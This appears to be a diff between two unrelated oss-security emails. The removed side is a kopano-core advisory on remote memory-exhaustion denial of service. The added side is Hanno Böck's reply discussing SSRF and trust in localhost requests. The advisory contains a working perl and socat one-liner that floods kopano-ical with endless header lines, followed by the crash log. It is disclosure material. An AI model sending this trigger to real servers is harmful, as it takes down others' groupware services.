@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1905" "Friday" "19" "March" "2021" "13:44:24" "+0100" "Jan Engelhardt" "jengelh@inai.de" nil "47" "[oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion" nil nil nil "3" nil nil (number mark "U       jengelh@inai Mar 19   47/1905  " thread-indent "\"[oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["975" "Saturday" "8" "August" "2020" "12:09:09" "+0200" "Hanno =?iso-8859-1?Q?B=F6ck?=" "hanno@hboeck.de" "<20200808120909.474405c1@computer>" "23" "Re: [oss-security] Voiding CVE-2020-16248" "^Date:" nil nil "8" "2020080810:09:09" "[oss-security] Voiding CVE-2020-16248" (number mark "        hanno@hboeck Aug  8   23/975   " thread-indent "\"Re: [oss-security] Voiding CVE-2020-16248\"\n") "<CAD77+gR7G5zBc4pwQ86H-UuMk6QOgPcuK8R-hmmHqv8+8_+dbw@mail.gmail.com>" ("<CAD77+gR7G5zBc4pwQ86H-UuMk6QOgPcuK8R-hmmHqv8+8_+dbw@mail.gmail.com>") nil nil nil nil nil nil nil "Re: [oss-security] Voiding CVE-2020-16248" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 21863 invoked by uid 550); 19 Mar 2021 12:45:20 -0000
+Received: (qmail 5822 invoked by uid 550); 8 Aug 2020 10:09:22 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,62 +11,40 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 21550 invoked from network); 19 Mar 2021 12:44:35 -0000
-Date: Fri, 19 Mar 2021 13:44:24 +0100 (CET)
-From: Jan Engelhardt <jengelh@inai.de>
-To: oss-security@lists.openwall.com
-Message-ID: <r4p33o1o-q1pp-8932-qso-36op579rn850@vanv.qr>
-User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
+Received: (qmail 5802 invoked from network); 8 Aug 2020 10:09:21 -0000
+Message-ID: <20200808120909.474405c1@computer>
+In-Reply-To: <CAD77+gR7G5zBc4pwQ86H-UuMk6QOgPcuK8R-hmmHqv8+8_+dbw@mail.gmail.com>
+References: <CAD77+gR7G5zBc4pwQ86H-UuMk6QOgPcuK8R-hmmHqv8+8_+dbw@mail.gmail.com>
+X-Mailer: Claws Mail 3.17.6 (GTK+ 2.24.32; x86_64-pc-linux-gnu)
 MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8BIT
-Subject: [oss-security] kopano-core 11.0.1: Remote DoS by memory exhaustion
+Content-Transfer-Encoding: quoted-printable
+Date: Sat, 8 Aug 2020 12:09:09 +0200
+From: Hanno =?iso-8859-1?q?B=F6ck?= <hanno@hboeck.de>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Voiding CVE-2020-16248
+To: oss-security@lists.openwall.com
 
+FWIW while I don't particularly care about the CVE assignment issue, I
+think there is a valuable discussion to have here.
 
-Initial publication, no CVE number yet (will request).
+I feel the issue here is that with SSRF there often seems to be some
+kind of difficulty to pinpoint whether something is actually a flaw or
+an intended feature and who's to blame.
 
-# Affected versions
+Ultimately these issues come down to this:
+* There's an expectation that network requests originating from
+  localhost (or from a tightly controlled internal network IP) can be
+  considered trustworthy and are performed by someone/something with
+  some form of local authority.
+* However that's not necessarily true as you may have many applications
+  that do outgoing network requests that in a variety of ways can be
+  controlled by an attacker.
 
-  * kopano-core 11.0.1     (current head of 11.x branch)
-  * kopano-core 10.0.7     (head of 10.x branch)
-  * kopano-core 9.1.0      (head of 9.x branch)
-  * kopano-core 8.7.16
-  * it is believed this affects all versions to date,
-    including zarafa 7.2.6, the discontinued predecessor
-    project to Kopano, sometimes still in use.
+I feel this is somehow also similar to fights between network security
+thinking and endpoint security thinking that we can see elsewhere.
+(e.g. the whole TLS interception debate.)
 
-The "kopano-ical" program implements a network service/trivial HTTP server.
-It imposes no length restrictions on HTTP headers, which can be exploited
-to memory-exhaust the process and have it terminate.
-
-# Trigger
-
-»
-  perl -e 'print "GET / HTTP/1.0\nHost: \n"; 
-           while(1) { print " " . "A" x 65000 . "\n"; }' |
-  socat - tcp-connect:kopano-ical.example.com:8080
-
-The exact port depends on configuration; 8000 is also typical choice.
-
-» systemctl status kopano-ical
-● kopano-ical.service - Kopano Groupware Core iCal/CalDAV Gateway
-   Loaded: loaded (/usr/lib/systemd/system/kopano-ical.service; enabled; vendor preset: disabled)
-   Active: failed (Result: signal) since Fri 2021-03-19 13:24:26 CET; 32s ago
-     Docs: man:kopano-ical(8)
-           man:kopano-ical.cfg(5)
-  Process: 2126 ExecStart=/usr/sbin/kopano-ical -F (code=killed, signal=ABRT)
- Main PID: 2126 (code=killed, signal=ABRT)
-
-kopano-ical[2126]: terminate called after throwing an instance of 'std::bad_alloc'
-kopano-ical[2126]: ----------------------------------------------------------------------
-kopano-ical[2126]: Fatal error detected. Please report all following information.
-kopano-ical[2126]: kopano-ical 8.7.16.0
-kopano-ical[2126]:   what():  std::bad_alloc
-systemd[1]: kopano-ical.service: Main process exited, code=killed, status=6/ABRT
-systemd[1]: kopano-ical.service: Unit entered failed state.
-systemd[1]: kopano-ical.service: Failed with result 'signal'.
-
-# Mitigation
-
-None known at this time.
+--=20
+Hanno B=C3=B6ck
+https://hboeck.de/
